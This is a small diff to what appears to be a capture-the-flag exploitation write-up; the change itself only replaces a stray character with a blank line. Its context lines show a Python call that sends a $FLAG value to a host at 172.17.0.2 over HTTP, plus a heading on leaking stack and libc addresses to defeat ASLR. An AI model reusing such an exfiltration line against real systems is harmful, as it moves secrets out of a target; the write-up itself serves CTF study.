@@ -100,7 +100,7 @@ import urllib.request
 urllib.request.urlopen("http://172.17.0.2:6969/flag?=$FLAG")
 EOF
 ```
-a
+
 ## Key Techniques
 
 1. **Information Leaks**: Leveraging provided stack and libc addresses to defeat ASLR
